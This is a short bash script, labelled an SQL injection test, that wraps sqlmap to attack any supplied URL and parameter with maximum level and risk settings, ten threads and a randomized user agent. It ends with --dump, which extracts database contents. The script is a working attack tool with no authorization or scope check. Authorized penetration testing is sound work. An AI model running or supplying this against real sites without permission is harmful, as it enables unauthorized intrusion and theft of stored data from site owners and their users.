#!/bin/bash

# SQL Injection Testing Script for Web App that uses MySQL
# Requires sqlmap to be installed

# Usage: ./mysql_injection_test.sh <target_url> <parameter>

TARGET_URL=$1
PARAMETER=$2

if [ -z "$TARGET_URL" ] || [ -z "$PARAMETER" ]; then
  echo "Usage: $0 <target_url> <parameter>"
  exit 1
fi

# Running sqlmap to test SQL injection on the target URL
echo "Starting SQL injection test on $TARGET_URL with parameter $PARAMETER..."

# Using sqlmap to test for SQL injection on the given parameter
sqlmap -u "$TARGET_URL" --data="$PARAMETER" --dbms=mysql --batch --random-agent --level=3 --risk=3 --threads=10 --dump

echo "SQL injection test complete."
